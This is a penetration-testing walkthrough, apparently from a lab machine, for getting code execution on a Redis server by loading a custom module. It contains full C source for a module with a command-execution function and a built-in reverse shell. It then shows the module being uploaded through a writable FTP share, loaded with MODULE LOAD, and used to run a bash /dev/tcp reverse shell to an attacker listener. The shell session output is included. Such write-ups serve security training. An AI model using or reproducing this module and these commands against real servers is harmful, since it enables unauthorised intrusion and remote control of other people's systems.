
We can build an redis module, load it into redis and get command execution.

## How To

1. Download it locally.

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
```

Navigate into the directory and "make".

Didn't work, had to fix the source code of "module.c" file.

```
#include "redismodule.h"
#include <string.h>  // For strlen, strcat
#include <arpa/inet.h>  // For inet_addr
#include <stdio.h> 
#include <unistd.h>
#include <stdlib.h> 
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 2) {
        size_t cmd_len;
        size_t size = 1024;
        const char *charcmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
        char *cmd = strdup(charcmd);  // Speicher für Befehl allozieren
        
        FILE *fp = popen(cmd, "r");
        if (fp == NULL) {
            free(cmd);
            return RedisModule_ReplyWithError(ctx, "ERR could not execute command");
        }
        
        char *buf = (char*)malloc(size);
        char *output = (char*)malloc(size);
        if (buf == NULL || output == NULL) {
            pclose(fp);
            free(cmd);
            if (buf) free(buf);
            if (output) free(output);
            return RedisModule_ReplyWithError(ctx, "ERR memory allocation failed");
        }
        
        output[0] = '\0';  // String initialisieren
        
        while (fgets(buf, size, fp) != NULL) {
            if (strlen(buf) + strlen(output) + 1 >= size) {
                size_t new_size = size * 2;
                char *new_output = realloc(output, new_size);
                if (new_output == NULL) {
                    free(buf);
                    free(output);
                    free(cmd);
                    pclose(fp);
                    return RedisModule_ReplyWithError(ctx, "ERR memory reallocation failed");
                }
                output = new_output;
                size = new_size;
            }
            strcat(output, buf);
        }
        
        RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
        RedisModule_ReplyWithString(ctx, ret);
        
        pclose(fp);
        free(buf);
        free(output);
        free(cmd);
    } else {
        return RedisModule_WrongArity(ctx);
    }
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 3) {
        size_t len;
        const char *ip = RedisModule_StringPtrLen(argv[1], &len);
        const char *port_str = RedisModule_StringPtrLen(argv[2], &len);
        int port = atoi(port_str);
        int s;
        
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);
        
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            return RedisModule_ReplyWithError(ctx, "ERR socket creation failed");
        }
        
        if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
            close(s);
            return RedisModule_ReplyWithError(ctx, "ERR connection failed");
        }
        
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        
        execve("/bin/sh", args, env);
        
        // Sollte nie hier ankommen, wenn execve erfolgreich
        close(s);
        return RedisModule_ReplyWithError(ctx, "ERR execve failed");
    }
    return RedisModule_WrongArity(ctx);
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) 
        return REDISMODULE_ERR;
        
    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
        
    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
        
    return REDISMODULE_OK;
}
```

Build the module

```
make
```

Received module.so file.

My next objective is to get the file somehow onto the server system.

In my case I had write access into an ftp share named "pub". --> default ftp path /var/ftp/pub

```
put module.so
```

I logged into redis-cli and loaded the module onto redis.

```
redis-cli -h 192.168.198.93
192.168.198.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK
```

Now I got command execution

```
192.168.198.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

## RCE

Start up listener.

```
nc -lvnp 80
```

Execute system command in redis.

```
192.168.198.93:6379> system.exec "bash -i >& /dev/tcp/192.168.45.202/80 0>&1"
```

Gained RCE.

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.198.93] 36226
bash: no job control in this shell
[pablo@sybaris /]$
```